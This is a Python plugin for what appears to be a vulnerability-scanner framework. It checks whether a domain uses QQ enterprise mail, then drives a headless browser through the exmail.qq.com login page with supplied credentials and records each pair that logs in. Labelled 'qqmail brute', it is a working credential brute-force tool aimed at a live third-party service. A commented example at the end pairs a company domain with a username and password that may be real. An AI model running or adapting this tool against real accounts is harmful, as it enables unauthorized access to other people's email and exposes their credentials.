# -*- coding:utf-8 -*- 
#!/user/bin python
#Description: Description 
#Author:      Bing
#Email:       amzing_bing@outlook.com
#DateTime:    2017-01-14 17:05:46

import sys
sys.path.append("..")

import requests,socket
from splinter import Browser
import dns.resolver

from common.captcha import Captcha
from common.wukong_Func import *
from common.wukong_TypeCheck import *

class WuKong(object):
	def __init__(self,  target = "",args = ""):
		self.target = target
		self.args = args
		self.result = {
			"bug_author" : "bing",
			"bug_name" : "qqmail 爆破",
			"bug_summary" : "qqmail brute", 
			"bug_level" : "high" , 
			"bug_detail" : [] ,
			"bug_repair" : "disables vulnerability password"
			}

	def scanemail(self,target):
		browser = Browser("phantomjs")
		url = 'https://en.exmail.qq.com'
		try:
			browser.visit(url)
		except Exception as e:
			return

		if self.args:
			username = self.args[0] + '@' + target
			password = self.args[1]
			#print username,password
			browser.find_by_id('inputuin').fill(username)
			browser.find_by_id('pp').fill(password)

			#click the button of login
			browser.find_by_id('btlogin').click()
			#time.sleep(1)
			redictUrl = 'https://en.exmail.qq.com/cgi-bin/frame_html'
			redictUrl2 = 'http://en.exmail.qq.com/cgi-bin/readtemplate'
			# print  browser.url
			if redictUrl2 in browser.url or redictUrl in browser.url:
				out = username + ":" + password
				browser.quit()
				self.result["bug_detail"].append(out)
		else:
			self.result["bug_detail"].append("dont\'t args")

		browser.quit()

	def run(self):
		#self.scanemail()
		if is_domain(self.target) == False :
			return []
		target = str(".".join(self.target.split(".")[1:]))
		MX = dns.resolver.query(target,'MX')

		qqmail = ""
		for result in MX:
			if "qq.com" in str(result.exchange):
				qqmail = "ok"
				break

		if qqmail == "ok" :
			self.scanemail(target)
			#self.test_baidu_search(target)
		else:
			return []





# text = ("kai.zhang" , "tiandao123")
# t = WuKong(target="www.tiandaoedu.com",args = text)
# t.run()
# print t.result
